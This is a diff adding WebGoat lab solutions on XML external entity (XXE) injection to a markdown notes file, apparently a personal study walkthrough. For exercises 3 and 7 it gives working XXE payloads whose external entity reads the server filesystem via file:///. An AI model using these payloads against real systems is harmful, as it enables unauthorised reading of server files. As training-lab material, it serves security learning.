@@ -122,6 +122,30 @@ username: Webgoat
 adelantar el tiempo de expiracion
 ```
 
+# A4
+## XXE
+### 3
+```xml
+<?xml version="1.0" encoding='UTF-8'?>
+<!DOCTYPE comment [
+  <!ELEMENT comment (Activity)>
+  <!ELEMENT Activity (#PCDATA)>
+  <!ENTITY xxe SYSTEM "file:///">
+]><comment>  <text>&xxe;</text></comment>
+```
+### 7 
+
+```
+Content-Type: application/xml;
+```
+```xml
+<?xml version="1.0" encoding='UTF-8'?>
+<!DOCTYPE comment [
+  <!ELEMENT comment (Activity)>
+  <!ELEMENT Activity (#PCDATA)>
+  <!ENTITY xxe SYSTEM "file:///">
+]><comment>  <text>&xxe;</text></comment>
+```
 
 ## JWT Tokens
 
